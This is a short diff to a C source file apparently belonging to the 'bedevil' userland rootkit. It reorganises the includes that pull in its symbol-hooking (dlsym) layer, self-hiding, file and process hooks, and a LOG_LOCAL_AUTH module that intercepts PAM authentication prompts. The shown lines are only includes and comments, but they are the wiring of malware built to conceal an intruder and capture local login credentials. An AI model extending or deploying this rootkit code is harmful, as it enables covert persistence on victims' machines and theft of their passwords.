@@ -11,10 +11,9 @@
 
 #include "bedevil.h"
 
-/* include our libdl functions s first. libdl.h
- * includes xor.c from util/ as both headers
- * depend on functions from each other.
- * i.e.: hook(), call(), ...*/
+/* libdl.h provides essential symbol resolving functions.
+ * (hook, call, getsym) not to mention the dlsym hook
+ * itself. */
 #include "hooks/libdl/libdl.h"
 #include "util/util.h"  /* now include util.h */
 #include "hiding/hiding.h"
@@ -28,9 +27,7 @@
 #endif
 
 #ifdef LOG_LOCAL_AUTH
-int pam_vprompt(pam_handle_t *pamh, int style, char **response, const char *fmt, va_list args);
-int pam_prompt(pam_handle_t *pamh, int style, char **response, const char *fmt, ...);
-#include "hooks/pam_vprompt.h"
+#include "hooks/authlog/authlog.h" // [LOG_LOCAL_AUTH]
 #endif
 
 #ifdef HIDE_SELF
@@ -48,7 +45,7 @@ int socket(int domain, int type, int protocol);
 #include "hooks/exec/exec.h"
 #include "hooks/open/open.h"
 #include "hooks/stat/stat.h"
-//#include "hooks/rw/rw.h" // including this is giving me a segfault. leaving it out for now.
+//#include "hooks/rw/rw.h"
 #include "hooks/dir/dir.h"
 #include "hooks/ln/links.h"
 #include "hooks/gid/gid.h"
